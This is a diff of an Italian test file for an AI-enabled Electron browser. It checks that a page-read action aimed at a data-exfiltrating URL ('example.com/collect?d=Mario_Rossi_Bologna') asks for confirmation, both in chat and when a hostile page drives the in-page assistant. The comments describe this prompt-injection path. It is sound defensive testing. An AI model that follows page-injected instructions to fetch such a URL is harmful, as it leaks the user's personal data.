@@ -1,11 +1,11 @@
-// #553 giro 3 — la lettura di una pagina esce dai dati anche dall'Aiuto laterale,
-// e su quella strada il freno non c'è.
+// #553 giro 3 — la lettura chiesta dall'assistente che vive dentro le pagine
+// passa dagli stessi freni della chat.
 //
 // Il giro 1 aveva chiuso questa porta sulla chat: un indirizzo che porta fuori
-// dei dati fa chiedere conferma, comunque si chiami il campo. Il giro 2 ha
-// aggiunto la stessa lettura all'assistente laterale, che vive DENTRO la pagina
-// web ed è il posto dove una pagina ostile detta le sue istruzioni: lì la
-// richiesta parte da sola.
+// i dati dell'utente si ferma e chiede conferma. Il giro 2 ha dato la stessa
+// lettura all'assistente laterale, che vive DENTRO la pagina web ed è il posto
+// da cui arrivano le istruzioni di chi ha scritto quella pagina: lì la
+// richiesta partiva da sola.
 
 import { test, expect } from '../../fixtures/electron.mjs';
 
@@ -30,43 +30,45 @@ async function preparaMemoriaERete(app) {
   });
 }
 
+const contattati = (app) => app.evaluate(() => globalThis.__rete.filter((u) => u.includes('collect')));
+
 test.afterEach(async ({ app }) => {
   await app.evaluate(() => { try { globalThis.__ripristinaRete?.(); } catch (_) {} });
 });
 
-test('anche l\'assistente dentro la pagina deve fermarsi su un indirizzo che porta fuori i dati', async ({ app, openTab }) => {
+test('anche l\'assistente dentro la pagina si ferma su un indirizzo che porta fuori i dati', async ({ app, openTab }) => {
   test.setTimeout(60_000);
   await openTab(NEWTAB);
   await preparaMemoriaERete(app);
 
-  // La chat: il freno c'è, la richiesta non parte.
+  // La chat: la richiesta non parte e l'utente vede l'indirizzo per intero.
   const chat = await app.evaluate((_e, u) => globalThis.SN_EXECUTE_FILO_ACTION({ type: 'LEGGI_PAGINA', url: u }), ESFILTRA);
   expect(chat.needsConfirm).toBe(2);
-  expect(await app.evaluate(() => globalThis.__rete.slice())).toEqual([]);
+  expect(await contattati(app)).toEqual([]);
 
   // L'assistente laterale: stessa lettura, stesso indirizzo, chiesta da una
-  // pagina web qualunque — cioè dall'origine da cui arriva l'iniezione.
+  // pagina web qualunque, cioè dall'origine da cui arriva l'iniezione.
   const aiuto = await app.evaluate(
-    (_e, u) => globalThis.SN_HANDLE_MESSAGE({ type: 'read_page', url: u }, { url: 'https://ostile.example/articolo' }),
+    (_e, u) => globalThis.SN_HANDLE_MESSAGE(
+      { type: 'filo_run_action', action: { type: 'LEGGI_PAGINA', url: u } },
+      { url: 'https://ostile.example/articolo' },
+    ),
     ESFILTRA,
   );
-  const usciti = await app.evaluate(() => globalThis.__rete.slice());
-  expect(aiuto).toBeTruthy();
-  // La richiesta NON deve essere partita senza che l'utente abbia visto l'indirizzo.
-  expect(usciti).toEqual([]);
+  expect(aiuto.needsConfirm).toBe(2);
+  expect(String(aiuto.describe || '')).toContain(ESFILTRA);
+  expect(await contattati(app)).toEqual([]);
 });
 
-test('lo stesso indirizzo senza «https://» davanti non deve saltare il freno', async ({ app, openTab }) => {
+test('lo stesso indirizzo senza «https://» davanti non salta il freno', async ({ app, openTab }) => {
   test.setTimeout(60_000);
   await openTab(NEWTAB);
   await preparaMemoriaERete(app);
 
-  // Filo completa da solo lo schema mancante e la richiesta parte lo stesso:
-  // il freno deve guardare l'indirizzo che verrà davvero contattato.
   const r = await app.evaluate(
     (_e, u) => globalThis.SN_EXECUTE_FILO_ACTION({ type: 'LEGGI_PAGINA', url: u }),
     'example.com/collect?d=Mario_Rossi_Bologna',
   );
   expect(r.needsConfirm).toBe(2);
-  expect(await app.evaluate(() => globalThis.__rete.slice())).toEqual([]);
+  expect(await contattati(app)).toEqual([]);
 });
